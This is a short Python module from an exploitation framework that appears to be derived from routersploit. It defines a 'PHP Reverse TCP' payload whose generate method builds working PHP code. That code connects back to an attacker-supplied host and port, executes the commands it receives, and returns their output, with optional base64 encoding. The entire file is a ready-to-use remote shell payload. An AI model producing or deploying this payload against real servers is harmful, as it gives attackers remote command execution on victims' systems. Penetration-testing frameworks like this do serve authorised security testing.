from wirelessxpl.core.exploit.option import OptEncoder
from wirelessxpl.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from wirelessxpl.modules.encoders.php.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "PHP Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using php.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # wirelessxpl module
        ),
    }

    architecture = Architectures.PHP
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
            "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
        )
